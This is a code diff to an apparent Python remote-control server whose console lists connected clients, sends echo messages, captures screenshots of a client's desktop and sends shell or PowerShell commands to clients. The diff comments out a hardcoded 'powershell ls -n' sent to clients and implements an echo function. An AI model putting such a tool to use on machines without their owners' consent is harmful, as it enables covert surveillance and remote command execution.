@@ -34,8 +34,9 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
                 print(f'{self.client_address} > ' + self.data.decode('utf-8'))
 
                 # send back data
+                self.request.sendall(b'Alive ping back received')
                 # self.request.sendall(b'powershell start brave www.google.ca') 
-                self.request.sendall(b'powershell ls -n')
+                # self.request.sendall(b'powershell ls -n')
         except ConnectionAbortedError :
             print('Client disconnected')
     
@@ -77,7 +78,7 @@ def central_commands():
             elif command[0] == 'list':
                 print_clients()
             elif command[0] == 'send_echo':
-                send_echo(command)
+                send_echo(msg)
             elif command[0] == 'get_SC':
                 get_SC(command)
 
@@ -88,7 +89,7 @@ def central_commands():
 def list_commands_available():
     print('help : List all the commands available')
     print('list : To list clients connected to the server')
-    print('send_echo [clientIP@port] [messageIn""]')
+    print('send_echo [clientIP@port] ["message"]')
     print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
     print('shell [clientIP@port] [\'Shell Command\'] : Send a Shell/Powershell command to the client')
 
@@ -99,11 +100,24 @@ def print_clients():
     else :
         print('Clients : ')
         for client in connected_clients:
-            print(client)
+            print(f'{client[0]}@{client[1]}')
 
+# Verify that the socket is not closed, share the method from client
+def send_echo(msg: str):
+    client_ip, client_port = msg.split(' ')[1].split("@")
+    client_port = int(client_port)
+    echo_msg = msg.split('\"')[1].replace('\"', "")
+    # print(f'Client : {client_ip} @ {client_port} and msg : {echo_msg}')
 
-def send_echo(client, msg):
-    pass
+    for client in connected_clients:
+        if client[0] == client_ip and client[1] == client_port:
+            client_socket = connected_clients.get(client)
+            command = f"echo {echo_msg}"
+            print(f'echo {echo_msg} sent')
+            client_socket.sendall(command.encode('utf-8'))
+        else :
+            print(f'Client {client_ip}@{client_port} is not is the list of connected client')
+
 
 
 def get_SC(client):
